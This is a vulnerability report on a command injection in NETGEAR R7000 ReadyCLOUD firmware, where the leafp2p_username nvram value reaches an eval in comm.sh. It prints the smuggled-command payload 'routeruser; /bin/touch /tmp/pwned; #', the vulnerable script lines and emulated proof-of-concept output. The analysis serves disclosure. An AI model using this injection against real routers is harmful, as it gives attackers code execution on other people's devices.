# Technical Report: NETGEAR R7000 ReadyCLOUD leafp2p-to-comm RCE

## Target Information

Firmware:

```text
NETGEAR R7000 V1.0.9.18_1.2.27
R7000-V1.0.9.18_1.2.27.chk
```

Affected files:

```text
/opt/broken/readycloud_control.cgi
/opt/broken/register.sh
/opt/broken/comm.sh
/usr/lib/libreadycloud.so
```

## Entry Chain

The web management ReadyCLOUD registration path reaches:

```text
PATH_INFO=/api/services/readycloud
REQUEST_METHOD=PUT
/opt/broken/readycloud_control.cgi
```

`readycloud_control.cgi` starts the ReadyCLOUD service path, reads the local LeafP2P credentials, and invokes:

```text
/opt/broken/register.sh '<owner>' '<password>'
```

The dynamic log confirms:

```text
Calling register.sh with line /opt/broken/register.sh 'alice@example.com' 'plainpass'
```

## State Propagation

String evidence from `readycloud_control.cgi` includes:

```text
Cannot get value from nvram (leafp2p_username)
leafp2p_username
readycloud_hostname
Cannot get value from nvram (leafp2p_password)
leafp2p_password
readycloud_password
Calling register.sh with line
```

Runtime evidence confirms the propagation:

```text
GET=leafp2p_username
readycloud_hostname=routeruser; /bin/touch /tmp/pwned; #
COMMIT=1
GET=leafp2p_password
readycloud_password=routerpass
COMMIT=1
```

## Command Execution Sink

In `/opt/broken/comm.sh`:

```text
14  NAS_NAME=`readycloud_nvram get readycloud_hostname`
15  NAS_PASS=`readycloud_nvram get readycloud_password`
20  COMM_EXEC="curl --basic -k --user ${NAS_NAME}:${NAS_PASS} --url ${URL}"
46  FULL_EXEC="`cat "${1}" | ${COMM_EXEC} -X POST --data-binary @- 2>/dev/null`"
53  eval COMM_RESULT="${FULL_EXEC}" || return $ERROR
```

`NAS_NAME` is derived from `readycloud_hostname`, which is derived from `leafp2p_username`. No shell escaping is applied before interpolation into `COMM_EXEC`.

With this payload:

```text
routeruser; /bin/touch /tmp/pwned; #
```

the shell interprets the semicolon as a command separator. The wrapper log records the truncated `curl` argv:

```text
curl --basic -k --user routeruser
```

The missing `:routerpass --url ...` portion was consumed after shell parsing because `/bin/touch /tmp/pwned` executed as a separate command and `#` commented the remainder.

## Dynamic Verification

The PoC script:

```text
verify_netgear_readycloud_leafp2p_to_comm_rce.sh
```

performs these steps:

1. Copies a clean firmware rootfs into an isolated work directory.
2. Places `qemu-arm-static` into the rootfs.
3. Builds a minimal ARM `libnvram.so` shim with SysV ELF hash style for uClibc compatibility.
4. Returns a malicious `leafp2p_username` and benign required ReadyCLOUD path keys.
5. Stubs outbound `curl`, `remote_smb_conf`, `system`, and `version` helpers to avoid external network dependencies.
6. Invokes `readycloud_control.cgi` with a benign registration JSON request.
7. Collects NVRAM access logs, wrapper logs, the XML registration body, and `/tmp/pwned` status.

The target shell scripts and `readycloud_control.cgi` remain original firmware files.

## Verification Result

The PoC was re-run twice from a freshly extracted firmware rootfs. Both runs produced:

```text
readycloud_hostname=routeruser; /bin/touch /tmp/pwned; #
curl --basic -k --user routeruser
[pwned]
-rw-r--r-- 1 root root 0 ... /tmp/pwned
```

This proves that:

- attacker-controlled persistent state reaches `readycloud_hostname`;
- `readycloud_hostname` reaches the command string;
- shell parsing executes the injected command;
- the side effect is created inside the emulated router rootfs.

## Security Boundary

This report intentionally does not claim a fully proven unauthenticated remote RCE. The current proof requires attacker-controlled pollution of `leafp2p_username`. The upstream mechanism that writes arbitrary metacharacters into that NVRAM key should be investigated separately.

